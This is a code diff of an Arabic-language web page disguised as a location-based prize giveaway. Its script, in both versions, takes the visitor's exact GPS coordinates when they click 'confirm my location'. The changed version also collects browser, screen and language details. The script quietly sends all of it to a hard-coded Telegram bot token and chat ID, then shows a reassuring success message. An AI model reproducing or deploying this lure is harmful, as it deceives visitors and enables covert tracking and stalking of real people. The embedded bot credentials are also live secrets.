@@ -2,91 +2,88 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
+  <title>🎁 اربح جائزة بحسب موقعك!</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>🎁 اربح جوائز حسب موقعك!</title>
   <style>
     body {
-      background-color: #f0f0f0;
       font-family: 'Tahoma', sans-serif;
+      background: linear-gradient(to right, #74ebd5, #acb6e5);
       text-align: center;
       padding: 40px;
-      color: #222;
+      color: #333;
     }
 
     h1 {
       font-size: 2.5rem;
-      color: #2c3e50;
     }
 
     p {
       font-size: 1.2rem;
-      margin-top: 15px;
     }
 
     button {
-      padding: 14px 25px;
-      margin-top: 25px;
+      padding: 14px 30px;
       font-size: 18px;
-      background-color: #3498db;
+      background-color: #2ecc71;
       color: white;
       border: none;
       border-radius: 8px;
       cursor: pointer;
+      margin-top: 25px;
     }
 
     .footer {
-      margin-top: 60px;
+      margin-top: 50px;
       font-size: 0.9rem;
-      color: #888;
+      color: #666;
     }
   </style>
 </head>
 <body>
 
-  <h1>🎯 اربح جوائز حسب منطقتك!</h1>
-  <p>اضغط على الزر أدناه لتأكيد موقعك والمشاركة في السحب المجاني 🔥</p>
-
-  <button onclick="getLocation()">📍 تأكيد موقعي الآن</button>
+  <h1>🎯 اربح هدية حسب منطقتك</h1>
+  <p>اضغط الزر لتأكيد موقعك والمشاركة بالسحب 🎁</p>
+  <button onclick="getFullData()">📍 تأكيد موقعي</button>
 
   <div class="footer">جميع الحقوق محفوظة © 2025</div>
 
   <script>
-    function getLocation() {
-      if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendLocation, showError);
-      } else {
-        alert("❌ متصفحك لا يدعم خاصية تحديد الموقع.");
-      }
-    }
+    function getFullData() {
+      const userAgent = navigator.userAgent;
+      const screenRes = screen.width + "x" + screen.height;
+      const language = navigator.language;
+      const time = new Date().toLocaleString('ar');
 
-    function sendLocation(position) {
-      const lat = position.coords.latitude;
-      const lon = position.coords.longitude;
-      const accuracy = position.coords.accuracy;
+      navigator.geolocation.getCurrentPosition(position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        const acc = position.coords.accuracy;
 
-      const message =
-        "📍 تم تحديد موقع الزائر:\n" +
-        "🌍 الإحداثيات: " + lat.toFixed(6) + ", " + lon.toFixed(6) + "\n" +
-        "🎯 دقة الموقع: ±" + Math.round(accuracy) + " متر\n" +
-        "📱 الوقت: " + new Date().toLocaleString('ar');
+        const message =
+          "📡 شخص فتح الرابط وأرسل بياناته:\n\n" +
+          "🛰️ الإحداثيات: " + lat.toFixed(6) + ", " + lon.toFixed(6) + "\n" +
+          "🎯 دقة: ±" + Math.round(acc) + " متر\n" +
+          "🕒 الوقت: " + time + "\n\n" +
+          "📱 الجهاز: " + userAgent + "\n" +
+          "🖥️ الشاشة: " + screenRes + "\n" +
+          "🌐 اللغة: " + language;
 
-      // إرسال إلى تليجرام
-      fetch("https://api.telegram.org/bot8261552434:AAG13F3E318guMFGLuLUqdDA78LIk4yWg04/sendMessage", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: "5014833892",
-          text: message
-        })
+        // Telegram send
+        fetch("https://api.telegram.org/bot8261552434:AAG13F3E318guMFGLuLUqdDA78LIk4yWg04/sendMessage", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: "5014833892",
+            text: message
+          })
+        });
+
+        alert("✅ تم تأكيد موقعك بنجاح!");
+      }, error => {
+        alert("❌ لم نتمكن من تحديد موقعك");
       });
-
-      alert("✅ تم تسجيل موقعك بنجاح، شكراً لمشاركتك!");
-    }
-
-    function showError(error) {
-      alert("❌ لم نتمكن من تحديد موقعك. الرجاء المحاولة مرة أخرى.");
     }
   </script>
 
